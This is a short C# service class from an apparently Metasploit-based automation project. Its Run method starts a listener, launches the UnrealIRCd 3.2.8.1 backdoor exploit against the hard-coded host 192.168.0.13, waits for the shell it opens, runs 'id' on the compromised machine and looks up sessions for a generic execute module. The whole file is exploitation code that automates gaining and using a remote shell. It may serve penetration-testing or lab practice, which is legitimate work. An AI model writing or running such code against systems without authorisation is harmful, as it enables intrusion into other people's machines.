using System;
using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Const;
using Lacey.Alexa.Common.Metasploit.Extensions;
using Lacey.Alexa.Common.Metasploit.Providers;
using Microsoft.Extensions.Logging;

namespace Lacey.Alexa.Explorer.Services.Services.Concrete
{
    public sealed class ExplorerService : IExplorerService
    {
        private readonly ILogger _logger;

        private readonly IMetasploitProvider _metasploit;

        public ExplorerService(
            IMetasploitProvider metasploit, 
            ILogger logger)
        {
            _metasploit = metasploit;
            _logger = logger;
        }

        public Task Run()
        {
            var rHost = "192.168.0.13";
            _metasploit.MultiHandlerExec(out var jobId);
            _metasploit.UnrealIrcd3281BackdoorExec(rHost);
            var shell = _metasploit.WaitModuleJob(ModuleNames.UnrealIrcd3281Backdoor, jobId);
            var result = _metasploit.ShellExec(shell, "id");
            Console.WriteLine(result);
            var sessions = _metasploit.GetModuleCompatibleSessions(ModuleNames.MultiGeneralExecute);

            return Task.CompletedTask;
        }
    }
}